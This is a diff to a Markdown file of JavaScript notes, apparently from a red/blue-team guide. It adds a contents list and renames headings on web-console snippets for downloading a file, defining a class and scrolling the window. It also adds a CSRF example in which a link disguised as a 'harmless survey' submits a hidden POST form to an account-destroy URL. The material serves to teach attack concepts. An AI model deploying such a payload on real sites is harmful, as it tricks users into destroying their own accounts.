@@ -1,6 +1,13 @@
 
 # CODE EXAMPLES
-## Download file via Web Console
+1. [DOWNLOAD FILE](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Javascript.md#download-file-webconsole)
+2. [CREATE CLASS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Javascript.md#create-class-webconsole)
+3. [CONTROL WINDOW SIDEBAR](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Javascript.md#control-window-sidebar-webconsole)
+4. [CSRF](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Javascript.md#csrf)
+
+<br />
+
+## Download File (WebConsole)
 ```
 function downloadURI(uri, name) 
 {
@@ -16,7 +23,7 @@ function downloadURI(uri, name)
 downloadURI("https://example.com/file.png", "captcha1")
 ```
 
-## Create Class in Web Console
+## Create Class (WebConsole)
 ```
 class Animals {
   constructor(name, age) {
@@ -38,6 +45,19 @@ console.log(bingo);
 console.log(bingo.sing());
 ```
 
-## Control Window Sidebar
+## Control Window Sidebar (WebConsole)
 - Open WebDev Tool
 - `window.scrollby(x, y);`
+
+
+## CSRF
+```
+<a href="http://www.harmless.com/" onclick="
+  var f = document.createElement('form');
+  f.style.display = 'none';
+  this.parentNode.appendChild(f);
+  f.method = 'POST';
+  f.action = 'http://www.example.com/account/destroy';
+  f.submit();
+  return false;">To the harmless survey</a>
+```
